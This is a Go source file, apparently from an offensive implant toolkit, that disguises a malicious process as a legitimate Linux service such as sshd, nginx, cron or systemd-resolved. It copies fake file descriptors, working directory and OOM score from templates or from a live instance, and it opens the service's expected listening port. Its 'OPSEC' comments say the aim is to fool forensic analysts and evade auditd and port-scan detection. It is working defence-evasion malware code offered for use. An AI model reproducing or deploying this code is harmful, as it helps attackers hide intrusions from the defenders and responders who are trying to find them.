package stealth

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// ProcessProfile captures the full observable profile of a running process.
// An analyst examining /proc/[pid]/* should see values consistent with
// the masqueraded service.
type ProcessProfile struct {
	Name     string
	Cmdline  string
	FDs      []FDEntry         // open file descriptors
	CWD      string            // working directory
	RootDir  string            // root directory
	OOMScore int               // OOM adjustment
	Umask    int               // file creation mask
	RLimits  map[string]string // resource limits
}

// FDEntry describes a single file descriptor to mimic.
type FDEntry struct {
	Path  string // what the fd points to (file, socket, pipe)
	Flags int
}

// ServiceProfiles contains fd/cwd templates for common services.
// These match what analysts expect to see in /proc/[pid]/fd/ for each service.
var ServiceProfiles = map[string]ProcessProfile{
	"sshd": {
		Name:    "sshd",
		Cmdline: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
		CWD:     "/",
		FDs: []FDEntry{
			{Path: "/dev/null", Flags: syscall.O_RDWR},
			{Path: "/var/log/auth.log", Flags: syscall.O_WRONLY | syscall.O_APPEND},
			{Path: "/var/run/sshd.pid", Flags: syscall.O_RDWR},
		},
		OOMScore: -1000, // sshd typically has OOM protection
	},
	"nginx": {
		Name:    "nginx",
		Cmdline: "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
		CWD:     "/",
		FDs: []FDEntry{
			{Path: "/var/log/nginx/error.log", Flags: syscall.O_WRONLY | syscall.O_APPEND},
			{Path: "/var/log/nginx/access.log", Flags: syscall.O_WRONLY | syscall.O_APPEND},
			{Path: "/var/run/nginx.pid", Flags: syscall.O_RDWR},
			{Path: "/etc/nginx/nginx.conf", Flags: syscall.O_RDONLY},
		},
		OOMScore: 0,
	},
	"systemd-resolved": {
		Name:    "systemd-resolved",
		Cmdline: "/lib/systemd/systemd-resolved",
		CWD:     "/",
		FDs: []FDEntry{
			{Path: "/run/systemd/resolve/stub-resolv.conf", Flags: syscall.O_RDWR},
		},
		OOMScore: -900,
	},
	"cron": {
		Name:    "cron",
		Cmdline: "/usr/sbin/cron -f",
		CWD:     "/var/spool/cron",
		FDs: []FDEntry{
			{Path: "/var/log/syslog", Flags: syscall.O_WRONLY | syscall.O_APPEND},
			{Path: "/var/run/crond.pid", Flags: syscall.O_RDWR},
		},
		OOMScore: 0,
	},
}

// BlendProcessProfile makes our process look like the target service in /proc.
// Opens expected files, changes cwd, sets OOM score, adjusts rlimits.
//
// OPSEC: This is deeper than just argv masquerade. Analysts running
// `ls -la /proc/[pid]/fd/`, `cat /proc/[pid]/cwd`, or `cat /proc/[pid]/oom_score_adj`
// all see values consistent with the masqueraded service.
func BlendProcessProfile(serviceName string) error {
	profile, ok := ServiceProfiles[serviceName]
	if !ok {
		// If we don't have a template, capture from a live instance
		return blendFromLive(serviceName)
	}

	return applyProfile(&profile)
}

func applyProfile(profile *ProcessProfile) error {
	// Set working directory (non-fatal if directory doesn't exist)
	if profile.CWD != "" {
		syscall.Chdir(profile.CWD)
	}

	// Open expected file descriptors
	// These show up in /proc/[pid]/fd/ and lsof output
	for _, fd := range profile.FDs {
		openExpectedFD(fd.Path, fd.Flags)
	}

	// Set OOM score adjustment
	if profile.OOMScore != 0 {
		setOOMScoreAdj(profile.OOMScore)
	}

	return nil
}

// openExpectedFD opens an existing file to create an expected fd entry.
// Only opens files that already exist — creating files on disk leaves forensic
// artifacts and can trigger filesystem monitoring / auditd alerts.
// The fd is intentionally leaked (not closed) so it persists in /proc/[pid]/fd/.
func openExpectedFD(path string, flags int) {
	fd, err := syscall.Open(path, flags, 0)
	if err == nil {
		_ = fd // intentionally leak — we want this fd visible in /proc
	}
	// If file doesn't exist, skip silently — better than creating artifacts
}

// setOOMScoreAdj writes to /proc/self/oom_score_adj.
// Services like sshd have -1000 (never kill). A random process with 0 stands out.
func setOOMScoreAdj(score int) {
	os.WriteFile("/proc/self/oom_score_adj", []byte(strconv.Itoa(score)), 0644)
}

// blendFromLive captures the profile from a running instance of the service.
func blendFromLive(serviceName string) error {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return err
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid <= 2 {
			continue
		}

		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			continue
		}

		if strings.TrimSpace(string(comm)) == serviceName {
			return mimicLiveProcess(pid)
		}
	}

	return fmt.Errorf("service %s not running", serviceName)
}

// mimicLiveProcess copies the observable profile from a live process.
func mimicLiveProcess(targetPID int) error {
	// Copy working directory
	cwd, err := os.Readlink(fmt.Sprintf("/proc/%d/cwd", targetPID))
	if err == nil {
		syscall.Chdir(cwd)
	}

	// Copy OOM score
	oomData, err := os.ReadFile(fmt.Sprintf("/proc/%d/oom_score_adj", targetPID))
	if err == nil {
		score, _ := strconv.Atoi(strings.TrimSpace(string(oomData)))
		setOOMScoreAdj(score)
	}

	// Copy open file descriptors (read target's fd links)
	fdDir := fmt.Sprintf("/proc/%d/fd", targetPID)
	fdEntries, err := os.ReadDir(fdDir)
	if err == nil {
		for _, fdEntry := range fdEntries {
			link, err := os.Readlink(fmt.Sprintf("%s/%s", fdDir, fdEntry.Name()))
			if err != nil {
				continue
			}
			// Skip sockets, pipes, anon_inode — only mimic file fds
			if strings.HasPrefix(link, "/") && !strings.Contains(link, "(deleted)") {
				openExpectedFD(link, syscall.O_RDONLY)
			}
		}
	}

	return nil
}

// OpenListenSocket opens a listening TCP socket on a port typical for
// the masqueraded service. This makes `ss -tlnp` and `netstat -tlnp`
// show an expected listening port.
//
// OPSEC: A process claiming to be sshd but not listening on port 22
// is instantly suspicious.
//
// The returned listener must be closed to stop the background accept goroutine.
func OpenListenSocket(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, err
	}

	// Accept connections in background and immediately close them.
	// This prevents port-scan detection from flagging us as a non-responding service.
	// The goroutine exits when listener.Close() is called (Accept returns error).
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return // listener closed — exit goroutine
			}
			conn.Close()
		}
	}()

	return listener, nil
}

// ServicePorts maps common service names to their default listening ports.
var ServicePorts = map[string]int{
	"sshd":             22,
	"nginx":            80,
	"apache2":          80,
	"mysql":            3306,
	"postgres":         5432,
	"redis-server":     6379,
	"systemd-resolved": 53,
}

// BlendNetworkForService opens the expected listening port for a service.
func BlendNetworkForService(serviceName string) (net.Listener, error) {
	port, ok := ServicePorts[serviceName]
	if !ok {
		return nil, fmt.Errorf("unknown service port for %s", serviceName)
	}
	return OpenListenSocket(port)
}
